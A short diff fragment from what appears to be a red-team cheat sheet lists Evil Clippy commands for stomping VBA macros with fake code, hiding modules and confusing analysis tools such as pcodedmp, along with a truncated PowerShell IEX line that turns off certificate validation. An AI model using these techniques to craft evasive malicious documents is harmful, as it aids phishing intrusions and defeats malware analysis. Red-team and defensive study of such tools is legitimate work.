@@ -13,13 +13,8 @@ set scriptblock IEX '[System.Net.ServicePointManager]::ServerCertificateValidati
 ### Evil Clippy
 ```
 EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc
-
 Evil Clippy can automatically hide all modules with the -g flag:
-
 EvilClippy.exe -g macrofile.doc
-
 Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag.
-
 EvilClippy.exe -r macrofile.doc
-
 ```
